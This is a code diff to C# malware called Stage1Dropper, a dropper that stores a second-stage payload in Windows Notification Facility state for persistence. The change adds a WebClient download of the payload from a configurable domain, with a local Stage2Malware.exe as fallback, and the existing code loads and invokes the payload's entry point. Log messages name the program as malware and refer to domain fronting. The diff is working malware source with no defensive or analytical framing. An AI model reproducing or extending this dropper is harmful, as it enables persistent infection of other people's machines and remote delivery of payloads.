@@ -6,6 +6,7 @@ using System.IO.Compression;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Threading;
+using System.Net;
 
 namespace Stage1Dropper
 {
@@ -15,7 +16,8 @@ namespace Stage1Dropper
         public const ulong PART_2 = 0x19890C35A3BC6075;
         public const ulong PART_3 = 0x19890C35A3BEC075;
         public const ulong WNF_XBOX_STORAGE_CHANGED = 0x19890C35A3BD6875;
-
+        private string Domain="";
+        
         static void Main(string[] args)
         {
             var casper = new byte[0];
@@ -45,8 +47,16 @@ namespace Stage1Dropper
             {
                 Log("Malware NOT found persisting!");
                 Log("Fetching malware using domain fronting ...");
-                /// TODO: Fetch from web
-                casper = File.ReadAllBytes(@".\Stage2Malware.exe");
+                
+                if (Domain!="")
+                {
+                WebClient Wclient = new WebClient();
+                casper= Wclient.DownloadData(Domain); 
+                }
+                else
+                {
+                    casper = File.ReadAllBytes(@".\Stage2Malware.exe");
+                }
 
                 Log("Publishing malware via Windows Kernel to 0x19890C35A3BEF075, 0x19890C35A3BC6075, and 0x19890C35A3BC6875");
 
@@ -100,7 +110,7 @@ namespace Stage1Dropper
             MethodInfo target = Assembly.Load(payload).EntryPoint;
             target.Invoke(null, null);
         }
-
+        
         public static byte[] Compress(byte[] data)
         {
             MemoryStream output = new MemoryStream();
@@ -110,7 +120,7 @@ namespace Stage1Dropper
             }
             return output.ToArray();
         }
-
+        
         public static byte[] Decompress(byte[] data)
         {
             MemoryStream input = new MemoryStream(data);
@@ -152,7 +162,7 @@ namespace Stage1Dropper
             }
             return data;
         }
-
+        
         [StructLayout(LayoutKind.Sequential)]
         public class WnfType
         {
